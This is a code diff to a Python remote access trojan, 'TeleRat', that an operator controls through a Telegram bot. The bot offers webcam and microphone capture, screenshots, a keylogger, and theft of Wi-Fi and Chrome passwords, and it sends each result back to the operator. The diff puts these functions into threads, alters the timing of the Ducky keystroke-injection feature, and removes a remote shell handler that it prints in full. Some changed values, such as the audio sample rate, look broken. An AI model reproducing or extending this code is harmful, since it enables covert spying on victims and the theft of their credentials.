@@ -55,9 +55,9 @@ def record():
         import sounddevice as sd
         from scipy.io.wavfile import write
         import wavio as wv
-        recording = sd.rec(int(10*44100),samplerate=44100, channels=2)
+        recording = sd.rec(int(5*4450),samplerate=4450, channels=2)
         sd.wait()
-        write("recording.mp3", 44100, recording)
+        write("recording.mp3", 4450, recording)
     except:
         pass
 
@@ -169,8 +169,8 @@ def screenshoot_click():
 
 #                      DUCKY
 
-def ducktopython(file):
-    f = open(file,"r",encoding='utf-8')
+def ducktopython():
+    f = open("TeleRat_DUCKSCRIPT.txt","r",encoding='utf-8')
     ducktopy = ''
     ducktopy = ducktopy+"import pyautogui\n"
     ducktopy = ducktopy+"import time\n"
@@ -178,7 +178,7 @@ def ducktopython(file):
     duckyScript = [x.strip() for x in duckyScript]
     defaultDelay = 0
     if duckyScript[0][:7] == "DEFAULT":
-	    defaultDelay = int(duckyScript[0][:13]) / 1000
+	    defaultDelay = int(duckyScript[0][:13]) / 500
     previousStatement = ""
     duckyCommands = ["WINDOWS", "GUI", "APP", "MENU", "SHIFT", "ALT", "CONTROL", "CTRL", "DOWNARROW", "DOWN","LEFTARROW", "LEFT", "RIGHTARROW", "RIGHT", "UPARROW", "UP", "BREAK", "PAUSE", "CAPSLOCK", "DELETE", "END","ESC", "ESCAPE", "HOME", "INSERT", "NUMLOCK", "PAGEUP", "PAGEDOWN", "PRINTSCREEN", "SCROLLLOCK", "SPACE","TAB", "ENTER", " a", " b", " c", " d", " e", " f", " g", " h", " i", " j", " k", " l", " m", " n", " o", " p", " q", " r", " s", " t"," u", " v", " w", " x", " y", " z", " A", " B"," C", " D", " E", " F", " G", " H", " I", " J", " K", " L", " M", " N", " O", " P"," Q", " R", " S", " T", " U", " V", " W", " X", " Y", " Z"]
     pyautoguiCommands = ["win", "win", "optionleft", "optionleft", "shift", "alt", "ctrl", "ctrl", "down", "down","left", "left", "right", "right", "up", "up", "pause", "pause", "capslock", "delete", "end","esc", "escape", "home", "insert", "numlock", "pageup", "pagedown", "printscreen", "scrolllock", "space","tab", "enter", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t","u", "v", "w", "x", "y", "z", "a", "b", "c", "d", "e", "f", "g", "h","i","j", "k", "l", "m", "n", "o", "p","q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
@@ -186,7 +186,7 @@ def ducktopython(file):
 	    if line[0:3] == "REM" :
 		    previousStatement = line.replace("REM","#")
 	    elif line[0:5] == "DELAY" :
-		    previousStatement = "time.sleep(" + str(float(line[6:]) / 1000) + ")"
+		    previousStatement = "time.sleep(" + str(float(line[6:]) / 500) + ")"
 	    elif line[0:6] == "STRING" :
 		    previousStatement = "pyautogui.typewrite(\"" + line[7:] + "\", interval=0.02)"
 	    elif line[0:6] == "REPEAT" :
@@ -212,20 +212,18 @@ try:
   def handle_start_help(message):
     markup = types.ReplyKeyboardMarkup(row_width=1)
     itembtn1 = types.KeyboardButton('Cam')
-    itembtn2 = types.KeyboardButton('Shell')
-    itembtn3 = types.KeyboardButton('Ducky')
-    itembtn4 = types.KeyboardButton('Record')
-    itembtn5 = types.KeyboardButton('wifipass')
-    itembtn6 = types.KeyboardButton('Keylogger')
-    itembtn7 = types.KeyboardButton('screenshot')
-    itembtn8 = types.KeyboardButton('chromepass')
-    markup.add(itembtn1,itembtn2,itembtn3,itembtn4,itembtn5,itembtn6,itembtn7,itembtn8)
+    itembtn2 = types.KeyboardButton('Ducky')
+    itembtn3 = types.KeyboardButton('Record')
+    itembtn4 = types.KeyboardButton('wifipass')
+    itembtn5 = types.KeyboardButton('Keylogger')
+    itembtn6 = types.KeyboardButton('screenshot')
+    itembtn7 = types.KeyboardButton('chromepass')
+    markup.add(itembtn1,itembtn2,itembtn3,itembtn4,itembtn5,itembtn6,itembtn7)
     bot.send_message(message.from_user.id,message.text, reply_markup=markup)
 except:
     pass
 
 #                      COMMANDS
-
 
 @bot.message_handler(content_types=['document'])
 def send_text(message):
@@ -236,7 +234,8 @@ def send_text(message):
             with open("TeleRat_DUCKSCRIPT.txt", "w") as f:
                 f.write(duck_script_run.decode('utf-8').replace('\n',''))
                 f.close()
-            ducktopython("TeleRat_DUCKSCRIPT.txt")
+            threading.Thread(target=ducktopython).start()
+            time.sleep(5)
             os.remove("TeleRat_DUCKSCRIPT.txt")
             bot.send_message(message.from_user.id, 'Script Executed')
         else:
@@ -276,7 +275,8 @@ try:
     try:
       if str(message.text).lower() == 'cam':
         bot.send_message(message.from_user.id, 'Processing command "Cam", Please wait...')
-        camera()
+        threading.Thread(target=camera).start()
+        time.sleep(5)
         photo = open('cam.png', 'rb')
         bot.send_photo(message.from_user.id, photo)
         photo.close()
@@ -289,7 +289,8 @@ try:
     try:
       if str(message.text).lower() == 'record':
           bot.send_message(message.from_user.id, 'Processing command "Record", Please wait...')
-          record()
+          threading.Thread(target=record).start()
+          time.sleep(5)
           recording = open('recording.mp3', 'rb')
           bot.send_voice(message.from_user.id, recording)
           recording.close()
@@ -302,7 +303,8 @@ try:
     try:
       if str(message.text).lower() == 'chromepass':
         bot.send_message(message.from_user.id, 'Processing Chrome Passwords, Please wait...')
-        chrome_password()
+        threading.Thread(target=chrome_password).start()
+        time.sleep(5)
         chrome_pass = open('chromepass.txt', 'rb')
         bot.send_document(message.from_user.id, chrome_pass)
         chrome_pass.close()
@@ -315,7 +317,8 @@ try:
     try:
       if str(message.text).lower() == 'screenshot':
         bot.send_message(message.from_user.id, 'Capturing Screenshot, Please wait...')
-        screenshoot_click()
+        threading.Thread(target=screenshoot_click).start()
+        time.sleep(5)
         photo = open('ss.png', 'rb')
         bot.send_photo(message.from_user.id, photo)
         photo.close()
@@ -329,9 +332,11 @@ try:
         if str(message.text).lower() == 'wifipass':
             bot.send_message(message.from_user.id, 'Capturing Wifi Passwords, Please wait...')
             try:
-                wifi_pass()
+                threading.Thread(target=wifi_pass).start()
+                time.sleep(5)
             except:
-                wifi_pass1()
+                threading.Thread(target=wifi_pass1).start()
+                time.sleep(5)
             wifi_pass_open = open('wifipass.txt', 'rb')
             bot.send_document(message.from_user.id, wifi_pass_open)
             wifi_pass_open.close()
@@ -340,23 +345,6 @@ try:
     except:
         bot.send_message(message.from_user.id, 'Error!')
 
-    #Shell
-    try:
-      if 'shell' in str(message.text).lower():
-        if 'shell' == str(message.text).lower():
-          bot.send_message(message.from_user.id, 'Type in the following order ->  shell "you_command"')
-        else:
-            if ' >> ' in message.text:
-                os.system(str(message.text)[6:])
-                shell = open(str(message.text)[6:].split(' >> ')[1], 'rb')
-                bot.send_document(message.from_user.id, shell)
-                shell.close()
-                if os.path.exists(str(message.text)[6:].split(' >> ')[1]):
-                    os.remove(str(message.text)[6:].split(' >> ')[1])
-            else:
-                os.system(str(message.text)[6:])
-    except:
-        bot.send_message(message.from_user.id, 'Error!')
 except:
     pass
 
